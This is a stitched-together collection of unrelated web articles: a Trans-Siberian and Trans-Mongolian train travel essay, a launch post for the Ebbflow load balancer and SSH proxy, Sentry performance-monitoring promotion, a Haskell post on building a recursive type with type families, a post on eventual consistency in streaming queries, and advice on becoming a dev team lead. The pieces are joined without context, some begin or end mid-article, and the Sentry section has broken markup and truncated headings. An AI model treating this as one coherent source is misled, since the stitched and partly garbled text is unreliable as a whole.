<p>Even when not manufactured in the DDR, the berths are <strong>generally uncomfortable</strong>, even in the misnamed Russian “luxe” or Chinese “soft sleeper”.&nbsp; The sheets are nailed to plyboard (we ended up buying an inflatable camping mattress because my dad’s back was wrecked by the four nights of the Moscow-Irkutsk stretch), the blankets are covered in stains of indeterminate origin and getting onto the top bunks requires acrobatics.&nbsp; If the window is closed, it’ll be stuffy and hot inside; if it’s open, every rattle, clank and blast of the horn is amplified and your toes will freeze.&nbsp; &nbsp;While the Trans-Siberian and most railways in China are continuously welded and thus smooth, the Trans-Mongolian is not, meaning your bedtime lullaby will be a constant&nbsp;<em>clunk-clunk, clunk-clunk</em>.</p>

<p>In addition, <strong>border crossings</strong> are both interminable and inevitably timed to happen in the middle of night.&nbsp; It was past midnight when we finally entered Mongolia after two hours of inspections, and while our arrival into China was at 9 PM, we all had to get off the train and wait for&nbsp;5 hours, until 2 AM, while they swapped the bogies from Russian to Chinese gauge.</p>
<p>Unsurprisingly, you’re likely to wake up groggy and grumpy.&nbsp; If you’re at your destination already, you’ll be decanted onto the streets and condemned to wander until your hotel opens; if not, you’ll probably catch up by napping in your bunk during the day, throwing your sleep cycle even more out of whack.</p>
<h2>So why do it?</h2>
<p>Well, that was quite the litany of whinging, why would anybody voluntarily subject themselves to this then?</p>
<p>It’s <strong>an opportunity to idle</strong>.&nbsp; There is way more time than there are things to do, so you can read a book, play cards, study the <a href="https://driftingclouds.net/2018/02/20/that-is-not-your-name-the-kafkaesque-world-of-russian-duolingo/">finer points of Russian grammar</a> on Duolingo, or just take a nap — and all the earlier kvetching aside, your train bunk is still more spacious and comfy than even a business class seat on an airplane.</p>
<p>Traveling by train, you get a <strong>sense of distance</strong>.&nbsp; I flew Beijing to Irkutsk in 2.5 hours, and saw basically nothing even from the window seat.&nbsp; Traveling the same route by train took 54 hours, and while I still can’t say I <em>really&nbsp;</em>know what it felt like to <a href="https://www.goodreads.com/book/show/17286667-on-the-trail-of-genghis-khan">cross the Gobi by camel</a>, now at least I have some reference point for the sheer scale of the feat.</p>

<p>But above all, <strong>you see a slice of real life</strong>.&nbsp; It’s not always pretty (any train traveler in India will have a hard time unseeing the spectacle of the track sides being used as a public lavatory), but simply put, without taking the train you wouldn’t see ramshackle Siberian dachas, rusting factories around Ulan-Ude, yurt cities around Ulan Bator, ghastly commieblocks around a Mongolian military base in the Gobi desert, Chinese factories spewing grey smoke into the skies of Inner Mongolia, the green hills of Shaanxi, the shaggy yaks wandering around the plateaus of Tibet, the massive scale of construction around Lhasa and more.&nbsp; This trip wouldn’t have been the same at all without it, and I have zero regrets.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>After almost a year of hard work, Ebbflow has launched! It has been an invaluable learning experience and I'm super excited to get this tool into the hands of other developers.</p>
    <p>Ebbflow is multi-cloud load balancer and SSH proxy service. You can use it to host websites (or generic TLS endpoints!) privately and securely with browser-trusted certificates which can be automatically provisioned and presented for you. Connect to your servers from anywhere, no matter where they are or what network they are in. In a word, Ebbflow is flexible.
    </p><h3>Why Ebbflow?</h3>
    <p>Networking is a pain. Configuring firewalls, DNS, EC2 security groups, port-forwarding, etc., is complicated and difficult. It can be extremely specific. And most importantly, it is inflexible. Let's look at an example: home hosting. If I asked you to host a website from your home computer/raspberry pi, with a browser-trusted certificate, how would you do that? How durable is it? How much manual configuration does it involve? The easiest solution I can think of involves port-forwarding your home router to a server of yours and routing your DNS name to your home's IP address. Is that private? What if your IP changes? Sounds fun. Don't get a new router! Or move!</p>
    <p>Enterprise web hosting can be little easier - all cloud providers have load balancers you can use to route traffic to your servers in a local network, typically in a single region. This will work for many people, but things get hard once you'd like to move outside this standard model. If you are familiar with cloud networking, consider the difficulty of the following situations: migrating from on-premises to cloud, cloud-cloud migration, being multi-region or global, routing to a Kubernetes cluster and handling updates, migrating from instances to containers, handling AZ failover, or region failover. A lot of these problems do have solutions - you <i>can</i> solve these problems and some are easier than others - but the solutions are vendor specific, disjoint, application specific, and typically inflexible.</p>
    <p>Ebbflow provides a single and global networking model that doesn't just solve a few of these problems, it solves all of these problems.</p>
    <h3>The Ebbflow Model</h3>
   <p><u>In short</u>: All things connect to Ebbflow. Ebbflow routes clients to servers, privately and securely.</p>
   <p><img src="https://ebbflow.io/resources/smallnarrow.png" width="100px"></p><p>Ebbflow flips the paradigm you are currently used to. With Ebbflow, your servers reach up and await connections. Ebbflow has the fun task of routing clients to your servers. When a client visits your website or endpoint, Ebbflow picks the nearest server and proxies the connection through the <a href="https://ebbflow.io/documentation#client" target="_blank">client</a> to your server process or local SSH daemon.</p>
    <p>This new way of modeling your network removes many of the roadblocks and bumps that the current world of networking has. Ebbflow allows for some interesting properties to be achieved:</p>
    <p><small>
    <ul>
       <li><strong>Firewall Friendly</strong> - Feel free to block all inbound connections to your servers yet still host your endpoint and be SSH-ed to.</li>
       <li><strong>Global &amp; Local</strong> - Ebbflow has one single interface for all customers and uses nearest-server routing to keep your traffic local for low latencies.</li>
       <li><strong>Multi Cloud</strong> - Ebbflow is deployed to AWS and Google Cloud, and is multi-region in both clouds. If a region Ebbflow is deployed to goes down, your clients <i>and servers</i> will both be routed to other regions or clouds. You don't need to account for region-failure when considering your server scaling, as your servers are always hittable.</li>
       <li><strong><a href="https://ebbflow.io/documentation#client" target="_blank">Linux, MacOS, Windows, Pi</a></strong> - Host where you want with what OS you want. Ebbflow is also ready to adopt new distros and targets to fit your needs</li>
       <li><strong>Centralized Certificate Management</strong> - Ebbflow manages and presents a browser-trusted <a href="https://letsencrypt.org/" target="_blank">Let's Encrypt</a> certificate to the visitors of your endpoint</li>
       <li><strong>LAN Agnostic</strong> - Ebbflow does not care what private network your servers are in and they can be completely isolated.</li>
       <li><strong>No Network, No Problem</strong> - Let's say you have a Raspberry Pi in the field collecting data over a cellular connection, this pi could host an endpoint, or be SSH-ed to with Ebbflow.</li>
       </ul>
       </small></p><p>This new networking model solves the above problems in a convenient and simple way. You can load balance across any network at any time. You can move the same instance between networks and without any configuration at all, the instance will continue to host your endpoint or be SSH-ed to. Multi cloud? Sure. Home hosting? Cool. Host from your Pi? Sweet!</p>
   <h3>Living in an Ebbflow World</h3>
   <p>Ebbflow takes many of the problems of modern networking off your play. Ebbflow use of technologies like nearest-host routing, global availability, and multi-cloud durability, all Ebbflow customers benefit from this as well. It's also low-investment in time and money to start hosting or connecting your servers. </p>
   <p>Prototyping and testing with Ebbflow takes <a href="https://ebbflow.io/quickstart#endpointguide" target="_blank">only a few minutes</a>. During the development of Ebbflow, I used Ebbflow many times to host endpoints or for SSH connectivity. One interesting case was that I was in a coffee shop using the SSH proxy feature to connect to my dev-box at home, while trying to fix a bug in the SSH proxy feature which caused occasional disconnects (now fixed). Ebbflow uses Ebbflow for its website and its linux package server - this request was served by <code id="hostname">aws-linux-i59278-useast</code>. Also Ebbflow uses Ebbflow to host its staging environment and testing stack. It is simpler and easier to configure than other load balancing solutions and provides so many features that others lack.</p>
   <p>I'm excited to see how people use Ebbflow to solve interesting problems. We want to hear about the ways it unlocks new forms of web hosting and connectivity (just <a href="mailto:info@ebbflow.io">email us!</a>). Ebbflow provides a simple solution to complex problems and simple ones such as hosting a personal blog on your Raspberry Pi that's currently collecting dust in your junk drawer. Like I said before, Ebbflow is flexible. It will meet you at your use case and remove the complexities of networking from your problem set. See for yourself, and start testing today with the <a href="https://ebbflow.io/create_account">free trial</a>!</p>

<p>From tracking down slow-loading pages to ensuring auto-completes actually complete, <a href="https://docs.sentry.io/performance-monitoring/getting-started/">Performance</a> gives you deeper visibility into the API calls and database queries that are critical toward delivering fast customer experiences with just five lines of code. </p>
<blockquote>
<p>We’ve been using Sentry since the early days of Tackle, so getting set up with Performance was literally a one-line change for us. It quickly identified problematic endpoints and how our users were being impacted. We’re now planning some improvements to these APIs; can’t wait to see those times go down!</p>

</a>Developers: Take Comfort in Resolving User Misery</h2>
<p>Slow is a relative term. It’s why, in order to properly troubleshoot a slow customer experience, you need a consistent metric for slow. Enter User Misery. By pairing industry metrics with user metrics, User Misery tells you what is making any number of users…miserable.

</a>Mission-critical Context</h2>
<p>Without context, a customer’s spinning pinwheel can quickly turn into a developer’s panic spiral. Transaction Summary surfaces transactions by duration time, related code errors, and impact to the customer. With it, you can quickly see the number of affected users as well as the transaction’s impact on your response time. And by defining Key Transactions, your team can prioritize those critical functions and callbacks that need to be addressed immediately.</p>

<p>Some error monitoring tools show you data from a frontend error. Only Performance can trace that frontend back to its API calls and slow database queries - all while surfacing related errors. What’s more, Performance aggregates the metadata surrounding your errors so you can easily search and sort your exceptions.</p>

<p>Sentry’s performance tracking has been a huge help for us. Before, it was difficult to know exactly how long key functions actually took to load in real-time conditions. Now, we have metrics to assess whether load times are acceptable and we can learn which conditions impact performance, as part of our drive to constantly improve the user’s experience.</p>

<p>Sometimes, writing Haskell is like having an argument with the compiler. You give it your reasoning, and it checks it over for flaws. And if it thinks it finds one, it will tell you all about it. You then have to look over what it told you, and figure out exactly what its complaint is. <em>Did I just express myself badly? Or am I actually wrong?</em> Or, very occasionally, the compiler is just being petulant and you have to work around it. Of course, if you’re <em>really</em> upset about GHC not accepting your perfectly reasonably argued program, you can <a href="https://gitlab.haskell.org/ghc/ghc/-/issues">go tell its parents</a>.</p>



<p>Haskell’s type system is pretty great, but one thing it doesn’t have, that some other type systems do have, is <em>recursive</em> types, by which I mean, types directly constructed from themselves. Recursive types are forbidden in Haskell.</p>



<p>Let’s say we want to create a recursive type <code>T = Maybe T</code>. The official introductory Haskell answer to this is that one cannot do this directly, but one can easily create a type <code>T</code> that <em>contains</em> <code>Maybe T</code>, sometimes called a “newtype wrapper”. Like this:</p>



<pre><code>newtype T = MkT (Maybe T)</code></pre>



<p>Simple enough. But can we do better than this? Can we create a type <code>T</code> that is actually equal to <code>Maybe T</code>? <em>Can we create the forbidden recursive type?</em></p>



<p>Let’s start with <em>won’t</em> work:</p>



<pre><code>type T = Maybe T</code></pre>



<pre>Example.hs:6:1: error:
    Cycle in type synonym declarations:
      Example.hs:6:1-16: type T = Maybe T</pre>



<p>The <code>type</code> keyword creates an <em>alias</em> for a type, and aliases cannot be recursive as they must eventually refer to an actual type.</p>



<p>Oddly enough, GHC <em>does</em> accept this:</p>



<pre><code>type family T where
    T = Maybe T</code></pre>



<p>Type families are strange things. They’re not quite “real” types, but neither are they mere aliases for types, as they don’t have to be fully resolved. Indeed you can declare a type family in one module, use it all over as if it were a real type, and then define the actual instances of that family in another module.</p>



<p>Sadly, though, GHC won’t let us actually use the instance. It rejects the obvious proof that <code>T</code> and <code>Maybe T</code> are the same type:</p>



<pre><code>type family T where
    T = Maybe T

proof :: T :~: Maybe T
proof = Refl</code></pre>



<pre>Example.hs:10:9: error:
    • Reduction stack overflow; size = 201
      When simplifying the following type: T</pre>



<p>Why is this? It’s because GHC can’t just accept what it’s been told, and instead endlessly tries to “reduce” (that is, expand) <code>T = Maybe&nbsp;T = Maybe&nbsp;(Maybe&nbsp;T)</code> etc, giving up when it reaches a safety limit. You can think of it as a kind of intellectual black hole, or an “infohazard” for the compiler: if it ever starts examining the strange secrets of your recursive type, it will get lost in the infinite abyss, until a built-in emergency mechanism kicks it awake after it’s twisted in the vortex 200 times (you can change this number if you want, or even let it run forever).</p>



<p>It turns out we <em>can</em> construct a type <code>T</code> together with a proper (non-bottom) proof value of <code>T :~: Maybe T</code>, we just have to be discreet. The key is to make sure GHC never comes across the unfathomable constraint <code>T ~ Maybe T</code>, because it will immediately become ensnared in the contemplation of its endlessness.</p>



<p>Instead, we prepare a lemma that is both harmless and more general, and then carefully specialise it to get the terrifying conclusion we want, using the <code>TypeApplications</code> extension, thus avoiding the need for any kind of inference:</p>



<pre><code>type family A p q where
    A () x = Maybe (A x ())

lemma :: forall x. (A () x) :~: Maybe (A x ())
lemma  = Refl

type T = A () ()

proof :: T :~: Maybe T
proof = lemma @()</code></pre>



<p>Actually constructing and deconstructing values of <code>T</code> will require a similar circumspection. The trick is, we don’t let GHC infer types. We musn’t let GHC <em>think</em>, because thinking about the bad thing leads it to madness. Instead, we apply all types by hand. Here’s the full program, including all the necessary extensions:</p>



<pre><code>{-# LANGUAGE RankNTypes, TypeApplications, TypeOperators,
    TypeFamilies, UndecidableInstances, AllowAmbiguousTypes #-}
module Main where
import Data.Type.Equality

type family A p q where
    A () x = Maybe (A x ())

lemma :: forall x. (A () x) :~: Maybe (A x ())
lemma  = Refl

type T = A () ()

proof :: T :~: Maybe T
proof = lemma @()

convert1 :: forall a b. a :~: b -&gt; a -&gt; b
convert1 Refl = id

convert2 :: forall a b. a :~: b -&gt; b -&gt; a
convert2 Refl = id

tconvert1 :: T -&gt; Maybe T
tconvert1 = convert1 @T @(Maybe T) proof

tconvert2 :: Maybe T -&gt; T
tconvert2 = convert2 @T @(Maybe T) proof

nothing :: T
nothing = tconvert2 $ Nothing @T

just :: T -&gt; T
just x = tconvert2 $ Just @T x

count :: T -&gt; Int
count t = case tconvert1 t of
    Nothing -&gt; 0
    Just t' -&gt; succ $ count t'

t3 :: T
t3 = just $ just $ just nothing

main :: IO ()
main = putStrLn $ show $ count t3
</code></pre>



<p>This program defines a truly recursive type <code>T = Maybe T</code>, constructs a value of it, and then deconstructs that value. (It does indeed correctly print “3”.) On the other hand, it’s <em>much</em> more complicated than just using a newtype like we’re supposed to…</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Streaming systems consume inputs and produce outputs asyncronously: the output of a system at any moment may not reflect all of the inputs seen so far. These systems provide various guarantees about how their outputs relate to their input. Among the weaker (but not unpopular) guarantees is <a href="https://en.wikipedia.org/wiki/Eventual_consistency">eventual consistency</a>. Informally, eventual consistency means if the input stops changing, the output will eventually arrive at the correct result.</p>
<p>In this post we’ll see that for as long as its input streams haven’t been stopped, natural eventually consistent computations can produce <em>unboundedly large and systematic errors</em>. If you are doing even slightly non-trivial computations, you should be prepared for your results to be <em>never-consistent</em> (a much less popular consistency definition). Until you pause the input streams and await correct answers, at least.</p>
<p>Not all is lost! There are stream processing systems that provide strong consistency guarantees. <a href="https://materialize.io/">Materialize</a> and <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a> both avoid these classes of errors by providing <em>always correct</em> answers, as do several other streaming systems.</p>
<p>If you want to avoid systematic and on-going errors in your results, you should probably check if the stream processor you use provides stronger consistency guarantees.</p>

<p>To quote from the <a href="https://en.wikipedia.org/wiki/Eventual_consistency">Wikipedia page on eventual consistency</a></p>
<blockquote><p>
  Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value.
</p></blockquote>
<p>Eventual consistency is most often invoked for key-value stores, where each key tracks an independent value and one can reasonably imagine not updating the value associated with a key for long enough that the right answer might shake out. For example, if a database stores a map from people to their addresses, your update to your own address might not be visible immediately, but if you give it a few minutes it will probably sort itself out (if you don’t further update your address).</p>
<p>The requirement is only that folks stop updating a specific key, not that they stop using the database entirely. The rest of the world can keep reading out addresses, even keep reading out your stale address, and an eventually consistent system is obliged to eventually update your address (assuming you don’t keep re-submitting updates). Eventual consistency is a workable definition of consistency for key-value stores, where the vast majority of operations do not conflict, and one can reasonably expect to wait out any inconsistency.</p>
<p>Is eventual consistency a workable definition of consistency for streaming computations?</p>
<h2>Streaming computations</h2>
<p>There are many streaming computations out there. I’m going to focus on a class that lines up well with our study of consistency: incremental view maintenance. Incremental view maintenance is where you’ve defined a view, essentially a name bound to a query, and want to see the output answers change as the input data change.</p>
<p>Let’s say you’ve defined a query that could be applied to a static dataset, something like</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>Now, the underlying <code>data</code> might change. As they do, we should produce the corresponding changes to the output. In this case, we would like to see how the <code>count</code> of the records in <code>data</code> have changed.</p>
<p>There are more complicated queries we might write. For example, this query determines the set of keys whose values are the largest among all keys:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>As <code>data</code> change, we would like to see the resulting set of keys track the maximum values</p>
<p>This next query determines the standard deviation of values for each key, and then selects out those values that are surprisingly large.</p>
<pre title="">-- determine average and stddev for groups
create view stats_by_key
select
    data.key,
    avg(data.value) as average,
    stddev(data.value) as deviation
from data
group by data.key;

-- select out surprisingly large values
select data.key, data.value
from data, stats_by_key
where
    data.key = stats_by_key.key and
    data.value &gt; average + 3 * devation
</pre>
<p>As <code>data</code> move around, the set of current outliers moves around too, and we would be delighted to be warned of them so that we can take some important action.</p>
<p>I don’t have strong opinions about whether these are exciting queries to compute, but we’ll use them as examples of streaming computations that can go surprisingly wrong. If your computations are more sophisticated than these examples, you might have even more to worry about.</p>
<h2>Eventual consistency in streaming: example 1</h2>
<p>What does a naive application of eventual consistency have to say about</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>It’s not really clear, is it? Even if there were clear keys we are writing to, the thing we want to be correct is an aggregation across all of them rather than the value associated with a specific key. That result depends on all values. We could still extrapolate the definition of eventual consistency out to mean that if the input stops changing entirely, the system will eventually update to the correct count of records in <code>data</code>.</p>
<p>Although you shouldn’t expect to see this in the wild, an eventually consistent streaming system is certainly permitted to delay its processing as long as there are any outstanding input records that haven’t been processed yet.</p>
<p>This is actually not as unreasonable as you might think. Many stream processors intentionally batch up their inputs to improve their efficiency, and get started only once they get a moment of fresh air in their input stream. This technique allows them to improve their throughput during load spikes, by batching and re-ordering updates (for example, bundling all updates to the same key). It would be natural to see updates out of order, but taken to the extreme this technique results is no updates during the load spike.</p>
<p>While this is not necessarily something you’ll see in a professional stream processor, nothing about eventual consistency prevents behavior like this. So, while it’s not the most realistic reason to be worried about eventual consistency, it paints a bit of a picture about what we might need to watch out for.</p>
<p>Let’s ignore the possibility that a technically correct eventually consistent processor could produce no results, and instead look at what happens for more reasonable systems on continually changing input streams.</p>
<h2>Eventual consistency in streaming: example 2</h2>
<p>Let’s take the query that selects out the keys with maximum values:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>This is how you express “argmax” in SQL, and it is roughly equivalent to a join between the collections <code>data</code> and <code>select max(data.value) from data</code>.</p>
<p>A reasonable person might expect to see the keys with maximum values here, and have an eventually consistent system eventually show it some maximal keys. Some head scratching and you might walk that back to “any keys at all” because they might no longer be maximal at the moment you see them. But <em>eventually</em> we should see <em>some</em> keys, right?</p>
<p>Nope.</p>
<p>At least, not as long as the input stream is allowed to change.</p>
<p>Imagine the join between <code>data</code> and <code>select max(data.value) from data</code> receives its eventually consistent inputs consistently later for <code>data</code> than for <code>select max(data.value) from data</code>. This is not unreasonable, as it can be easier to maintain a <code>max</code> than to maintain an entire collection (<code>data</code>). As each record of <code>data</code> arrives, even those records with maximal values at the time of their submission may find that the maximum has advanced before they got there. They no longer match the maximum value, and are not produced as output.</p>
<p>Let’s demonstrate this in <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a>. We’ll have to fake some things out, because its consistency guarantees are unfortunately too strong. Fortunately, we can directly program transient delays in to the dataflow.</p>
<p>Imagine a collection that may have multiple keys in it, but we’ll only need one. We’ll increment the value associated with the key regularly (perhaps this is bandwidth used, or money spent, or most recent access, or …). Importantly, we’ll delay the update along one path by the gap in time between updates.</p>
<pre title="">// Global aggregation of values, on-time.
let input1 =
data.map(|(key,val)| ((),val))
    .max_by_key() // not real; should be `reduce(...)`.
    .map(|((), val)| (val, ()));

// Delayed map from values back to their keys.
let input2 =
data.delay(|t| t + 1)
    .map(|(key,val)| (val,key));

// Observe any results
input2.semijoin(&amp;input)
      .inspect(|x| println!("KEY: {:?}", x));
</pre>
<p>We’ll feed in changes that add elements to <code>data</code>, one at a time. Roughly like so</p>
<pre title="">(key, 1000)
(key, 2000)
(key, 3000)
...
</pre>
<p>The keys and values aren’t important, other than that the maximum increases. If the maximum increases within the time of the delay associated with the “eventual” nature of the consistency, we see no results:</p>
<pre title="">    Finished dev [unoptimized + debuginfo] target(s) in 0.04s
     Running `target/debug/examples/eventual`
Round 0 complete
Round 1 complete
Round 2 complete
Round 3 complete
Round 4 complete
Round 5 complete
...
</pre>
<p>Suffice it to say we didn’t see any <code>KEY</code> reports. We would, eventually, if we were to stall the input stream and allow one of the inputs to the join to catch up to the other.</p>
<p>What happens if we <code>delay</code> the <code>max</code> computation instead of the <code>data</code> stream? If the updates overwrite their previous values (<em>i.e.</em> if <code>(key, 2000)</code> overwrites <code>(key, 1000)</code>) then we also see no outputs, because by the time the maximum arrives the value has changed.</p>
<p>Eventual consistency is pretty badly suited to problem of aligning data, when the contents of either of those streams of data can be expected to move on. In our case, the maximum is regularly …</p></div></div>

<h2><strong>Getting promoted to dev team lead</strong></h2>



<p>I was 24 years old. A baby.&nbsp;</p>



<p>Three years into my software engineering career and loving it.&nbsp;</p>



<p>Life was great. I lived in a small apartment in Southie (Boston) with <a rel="noreferrer noopener" href="https://www.linkedin.com/in/vinh-quang-van-ha-b7023a10/" target="_blank">my college roommate “Q”</a>. I had a good job at a tech start-up called CloudLock. I hammered out code 12-14 hours a day. I worked so much I never knew what day it was and my bosses had to force me to go home. When I wasn’t working, I was playing <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Cornhole" target="_blank">bags (aka cornhole)</a> with my friends, lighting people up in Super Smash Bros Melee, or sleeping. Not a care in the world.&nbsp;</p>



<p>Then a freight train hit me.&nbsp;</p>



<figure><picture>

<img src="https://linearb.io/wp-content/uploads/2020/06/train_V2.png" alt="Getting promoted to dev team lead felt like getting hit my a freight train." srcset="https://linearb.io/wp-content/uploads/2020/06/train_V2.png 1700w, https://linearb.io/wp-content/uploads/2020/06/train_V2-300x141.png 300w, https://linearb.io/wp-content/uploads/2020/06/train_V2-1024x482.png 1024w, https://linearb.io/wp-content/uploads/2020/06/train_V2-768x361.png 768w, https://linearb.io/wp-content/uploads/2020/06/train_V2-1536x723.png 1536w" sizes="(max-width: 1700px) 100vw, 1700px">
</picture>
</figure>



<p>My boss, our VP of Engineering <a href="https://www.linkedin.com/in/michael-zeldich-b788a8/" target="_blank" rel="noreferrer noopener">Michael Zeldich</a>, pulled me aside one day. He explained our team was growing fast and it was getting tough for him to have 15+ engineers reporting to him directly. We needed to put some team leads in place so we could scale our org and make sure everyone was getting enough attention.&nbsp;</p>



<p>Would I be interested?&nbsp;</p>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/head_explosion_V2-1024x482.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/head_explosion_V2-1024x482.png 1024w, https://linearb.io/wp-content/uploads/2020/06/head_explosion_V2-300x141.png 300w, https://linearb.io/wp-content/uploads/2020/06/head_explosion_V2-768x361.png 768w, https://linearb.io/wp-content/uploads/2020/06/head_explosion_V2-1536x723.png 1536w, https://linearb.io/wp-content/uploads/2020/06/head_explosion_V2.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>&nbsp;Ok… I’m not going to lie. I was surprised. But it wasn’t the first time I thought about it.&nbsp;</p>



<p>CloudLock was my second job out of college. My first job was working for Nuance Communications. I got a taste of what it might be like to lead a team when my boss went on vacation for two weeks. He nominated me to be the engineering contact for tech support while he was out. In those two weeks, my network within the company expanded, I got on customer calls for the first time and I got to see what it was like being responsible for more than just my own code. It was pretty fun and I was good at it!&nbsp;</p>



<p>That experience was in my mind that day while Michael and I were talking. I wanted to say yes but I had a million questions.&nbsp;</p>



<p>I don’t remember his exact words, but he gist of what Michael said was “Don’t worry. You’re going to be great. I’ll help you and we’ll make it work together.”&nbsp;</p>



<p>Michael is a really good guy. I trusted and respected him. So that was all I needed to hear.&nbsp;</p>







<h3><strong>My first few months on the job&nbsp;</strong></h3>



<p>Looking back on it, in those first few months, I didn’t really understand the job.&nbsp;</p>



<p>I was going through the motions. Mimicking all of the things I had seen other dev team leads do.&nbsp;</p>



<p>Don’t get me wrong. I did some good. But I also had quite a few struggles.&nbsp;</p>



<p>For starters, every time there was a problem, I went into Superman mode. Single-handedly fixing it at the speed of light. After all, I was a great coder and had an expanding set of knowledge of the entire system. And I was good at helping other developers fix their problems. That is why I got promoted to team lead, right? (Kinda.)&nbsp;</p>



<p>Some of the team actually liked it at first. They acknowledged me for getting my hands dirty and being helpful and responsive.&nbsp;</p>



<p>But some of the team didn’t like it. It came across as controlling. And the ones who liked it initially stopped liking it because they were making the same mistakes over and over again and not getting better. Our weaker devs stayed weak and our stronger devs weren’t growing.</p>



<p>There were more mistakes. Like when I waited too long to fire a bad developer who’s negative behavior was hurting the team.&nbsp;</p>







<h2><strong>8 things they didn’t tell me&nbsp;</strong></h2>



<p>I believe being a leader is a never-ending journey. There’s always more to learn. Thankfully, I had great mentors who taught me a lot. And I also learned some lessons the hard way.&nbsp;</p>



<p>Here’s 8 things I wish I knew back then.</p>







<h3><strong>1. Many of your skills don’t translate.&nbsp;</strong></h3>



<p>The cruel irony is that there is a reverse connection between strong individual dev skills and dev team lead skills. The strongest devs will have more of an uphill battle starting out as managers.&nbsp;</p>



<p>75% of the issues we face as a dev team lead are not technical. The job is mostly about people and processes. Once I realized this, everything changed for me.&nbsp;</p>



<p>I could fix anything in the codebase. I was great at finding creative solutions to fix problems other devs were having. Not only are those skills not super relevant anymore, there are other traits of great devs that can actually hurt you as manager:&nbsp;</p>



<p><strong>Superman complex.</strong> If the team has a technical problem (bug, technical blocker), great devs often have the instinct to jump in and fix it right that second. In fact, when I did that as a dev, I received praise from my peers and leaders for being a great team player. As a manager when you do that, you’re the opposite of a team player.&nbsp;</p>







<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/06/superman2.png.webp 1700w" sizes="(max-width: 1700px) 100vw, 1700px">
<img src="https://linearb.io/wp-content/uploads/2020/06/superman2.png" alt="Dev team lead: Sometimes they suffer from superman complex" srcset="https://linearb.io/wp-content/uploads/2020/06/superman2.png 1700w, https://linearb.io/wp-content/uploads/2020/06/superman2-300x141.png 300w, https://linearb.io/wp-content/uploads/2020/06/superman2-1024x482.png 1024w, https://linearb.io/wp-content/uploads/2020/06/superman2-768x361.png 768w, https://linearb.io/wp-content/uploads/2020/06/superman2-1536x723.png 1536w" sizes="(max-width: 1700px) 100vw, 1700px">
</picture>
</figure>







<p>Instead, we need to enable our people to solve the problem. Even if it takes longer the first time. Even if they make mistakes. Even if they don’t do it as well we would.&nbsp;</p>



<p>By helping your team figure it out, instead of doing it for them, you’ll get many benefits. Your people will see that you trust them. They’ll learn more. They’ll become more self-sufficient over time. And they’ll also learn to help each other which will bring the team closer together.&nbsp;</p>



<p><strong>Pro tip:</strong> Avoid judgment at all costs. When your people feel free to get out of their comfort zone and make mistakes without fear of criticism, you’ll see their true creativity come out and you’ll be amazed at what they’re capable of.&nbsp;</p>



<div><p><strong>Pro tip: </strong>You can scale yourself by educating your people on your thought process. Help them understand why your instincts kicked in about a problem. Explain the process you go through to diagnose the issue. Explain your mental model for identifying fix options. Explain how you would communicate everything to the rest of the team.</p><p><strong>Deep focus.</strong> Another skill that did not serve me well as a manager was deep focus. As a dev, you have to get in the zone. I was good at locking in and focusing all of my energy on a single problem. That will kill you as a dev team lead.&nbsp;</p></div>



<p>Great leaders embrace context switching. They move around. They talk to a lot of people. If you find yourself locked in on a technical problem for hours, that’s probably a sign that you need to delegate more.&nbsp;</p>



<p>When you do have the luxury of deep focus time, use it to think about strategic initiatives. Like how to propose your next big non-functional investment to your executive team or the profile of your next three dev hires.</p>







<h3><strong>2. Keep your instincts. Change your behavior.&nbsp;</strong></h3>



<p>Great devs have great instincts. Your intuition, which comes from your experiences, your expansive knowledge of the system, and your understanding of the end-to-end process, allows you to feel things even before you can even put your finger on exactly what it is. You sense when you went down the wrong path in your code. You sense when your team’s iteration is behind schedule.&nbsp;</p>



<p>Continue to hone these instincts. Just don’t act on them the same way you used to.&nbsp;</p>



<p>You need your spidey sense even more now to figure out when others need help:</p>



<ul><li>When you hear something in your daily stand-up that doesn’t sound right.&nbsp;</li><li>When someone can’t find the root cause of a production issue.&nbsp;</li><li>When you’re helping out on a code review.&nbsp;</li></ul>



<p>But if we aren’t jumping in like Spiderman to save the day, then what?&nbsp;</p>



<p>(Superman? Spiderman? Make up your mind, Dude! I know. Actually, Deadpool is my favorite superhero. What’s the best Deadpool quote about engineering leadership you ask? “House blowing up builds character.”)&nbsp;</p>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/DP-1-1024x595.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/DP-1-1024x595.png 1024w, https://linearb.io/wp-content/uploads/2020/06/DP-1-300x174.png 300w, https://linearb.io/wp-content/uploads/2020/06/DP-1-768x446.png 768w, https://linearb.io/wp-content/uploads/2020/06/DP-1-1536x893.png 1536w, https://linearb.io/wp-content/uploads/2020/06/DP-1.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>







<p>First, take a breath. I process things quickly but that can be a disadvantage as a manager. Keep listening and take extra time to process.</p>



<p>If you aren’t hearing enough info, ask questions. Gather as much information as possible before you offer any advice. Sometimes, just asking the right question helps your dev think about the issue in a new way and come up with a solution on their own.&nbsp;</p>



<p><strong>Pro tip: </strong>The stand-up is an especially useful time to listen for things that might be slightly off. If I was <a href="https://linearb.io/blog/my-team-goes-home-on-time-every-night/" target="_blank" rel="noreferrer noopener">worried someone was not on track</a>, these questions always helped me figure out if I needed to dig deeper:</p>



<ul><li>Has (fill in the dev or team who is dependent on this work) reviewed this?</li></ul>



<ul><li>What are you thinking for scalability testing?</li><li>Tell me about your feature roll-out plan?</li></ul>







<h3><strong>3. Communicate “why” more than “what” and “how”.&nbsp;</strong></h3>



<p>As developers, we’re used to dealing with what and how. As dev managers, those are still relevant but it’s more important for us to focus on why.&nbsp;</p>



